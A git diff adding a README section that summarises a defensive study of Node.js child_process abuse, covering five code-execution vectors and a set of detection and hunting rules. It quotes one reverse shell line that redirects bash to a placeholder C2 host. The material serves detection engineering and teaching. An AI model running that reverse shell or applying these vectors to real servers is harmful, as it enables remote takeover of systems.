@@ -686,6 +686,22 @@ The R&D document is the bible for the complete framework. It covers why two work
 
 📄 **[MTDF AI Copilot — R&D Master Document v2.md](https://github.com/azdabat/-AI-LLM-Autonomous-Systems/blob/main/MTDF%20AI%20Copilot%20%E2%80%94%20R%26D%20Master%20Document%20v2.md)**
 
+---
+### 14 · Node.js Child Process Abuse — Tradecraft Study, Attack Analysis & Full MTDF Detection Architecture
+
+> *"Node.js is not a malware delivery vehicle. It is a trusted runtime that attackers weaponise. The minimum truth is not the JavaScript — it is what the JavaScript spawns."*
+
+Node.js powers a significant proportion of modern web infrastructure, and its `child_process` module — which allows JavaScript to execute arbitrary system commands — represents one of the most exploited attack surfaces in web application security. This study examines how adversaries identify Node.js backends, exploit them through five distinct code execution vectors, and weaponise the `child_process` module to deliver reverse shells and remote access payloads across both Linux and Windows environments.
+
+The study provides a complete dissection of the five primary exploitation vectors: Server-Side JavaScript Injection via `eval()` and `new Function()`, Prototype Pollution through vulnerable recursive merge functions (including the full EJS template engine RCE chain from `__proto__.escapeFunction` through `new Function()` execution), deserialisation attacks via `node-serialize`, command injection through unsanitised `exec()` string concatenation, and supply chain compromise through malicious `postinstall` hooks. Each vector is analysed at the payload level — including the TCP socket redirection anatomy of the classic `bash -i >& /dev/tcp/C2/PORT 0>&1` reverse shell — with full attack chains illustrated in Mermaid sequence and flow diagrams.
+
+The detection architecture applies the Minimum Truth Detection Framework across the complete three-layer inference spectrum. The minimum truth across all five attack vectors is identical regardless of exploitation method: `node.exe` or `node` spawning a dangerous child process with RCE-indicative command-line content. This architectural invariant makes detection resilient to payload variation — the JavaScript exploit changes but the telemetric substrate does not. Four production rules are delivered: a permanent 30-day Primitive Collector for retrospective incident stitching, a cross-platform Composite Sensor (base 55, threshold 75) covering Linux reverse shells, pipe-to-shell download chains, and Windows PowerShell cradles, a Router Rule with full decomposition tracker routing by child tool noise domain (bash/curl/python/PowerShell each requiring separate suppression models), and a PEAK/TAHITI Architecture 4 Hunt Query with signal tagging for proactive estate-wide hypothesis validation.
+
+Each rule includes complete MTDF annotations — scoring decision tables, minimum fire path arithmetic, cousin technique ecosystem mapping, and HunterDirective branching with SOC escalation guidance. Schema confidence notes and the no-ghost-chains independence doctrine are enforced throughout. The study concludes with a cousin technique build roadmap covering PHP `exec()`, Python `subprocess`, and Java `Runtime.exec()` abuse as the nearest adjacent sensors in the web application runtime RCE ecosystem.
+
+**Covers:** Node.js reconnaissance fingerprinting · SSJI via eval() · Prototype pollution to EJS RCE · Deserialisation attacks · Command injection · Supply chain postinstall hooks · Bash reverse shell anatomy · Download-and-execute chains · Windows PowerShell cradle from Node · Primitive Collector (Architecture 6) · Composite Sensor (Architecture 1) · Router Rule with decomposition tracker · PEAK/TAHITI Hunt Query · Cousin technique ecosystem · Application hardening recommendations
+
+📄 **[NodeJS_ChildProcess_RCE_Study.md](https://github.com/azdabat/MTDF-Copilot-Framework/blob/main/NodeJS_ChildProcess_RCE_Study.md)**
 
 
 ---
